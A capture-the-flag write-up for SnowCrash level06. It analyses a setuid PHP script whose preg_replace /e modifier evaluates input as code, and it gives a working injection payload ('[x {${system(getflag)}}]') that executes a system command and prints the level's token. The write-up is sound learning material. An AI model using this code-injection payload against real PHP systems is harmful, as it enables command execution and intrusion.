# SnowCrash

## Level06

```sh
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

```sh
level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
```

```php
#!/usr/bin/php
<?php
// Function y($m): Processes a string and performs specific replacements.
function y($m) { 
    // Replace all occurrences of '.' with ' x '.
    $m = preg_replace("/\./", " x ", $m); 
    // Replace all occurrences of '@' with ' y'.
    $m = preg_replace("/@/", " y", $m); 
    // Return the modified string.
    return $m; 
}

// Function x($y, $z): Processes a file and performs transformations on its content.
function x($y, $z) { 
    // Read the contents of the file specified by $y (first argument).
    $a = file_get_contents($y); 

    // Perform a regex replacement with the /e modifier (dangerous!).
    // Matches patterns of the form [x data] and replaces them with the result of y("data").
    // The /e modifier evaluates the replacement string as PHP code, which is a security risk.
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 

    // Replace all occurrences of '[' with '('.
    $a = preg_replace("/\[/", "(", $a); 
    // Replace all occurrences of ']' with ')'.
    $a = preg_replace("/\]/", ")", $a); 

    // Return the modified content.
    return $a; 
}

// Main script execution:
// Call the x function with the first and second command-line arguments.
// $argv[1] is expected to be a file path.
// $argv[2] is unused in the function.
$r = x($argv[1], $argv[2]); 

// Print the result of the x function.
print $r;
?>
```

So basically what it does is take a file as an argument, parse the file and check for occurrences of this pattern [x data] and replace data with the return value of y(data)

We can exploit this due to the /e modifier

##### Explanation

https://agethemes.com/deprecated-preg_replace-the-e-modifier-is-deprecated-use-preg_replace_callback-instead-in/

The e modifier is a deprecated regex modifier that treats the replacement string as PHP code directly and evaluates it (it can execute code for us)

We should be able to write [x system(getflag)] in a file in order to execute it

```sh
level06@SnowCrash:~$ echo '[x system(getflag)]' > /tmp/exploit
level06@SnowCrash:~$ ./level06 /tmp/exploit
system(getflag)
```

This is printing system(getflag) instead of executing it
We need to use this syntax {$(system('getflag'))} 
[Complex curly parsing: https://www.php.net/manual/fr/language.types.string.php#language.types.string.parsing.complex]

system('getflag') will then first be executed instead of being treated as a string litteral (Kinda works the same as an expended variable in shell)

```sh
level06@SnowCrash:~$ echo '[x {${system(getflag)}}]' > /tmp/exploit
level06@SnowCrash:~$ ./level06 /tmp/exploit
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```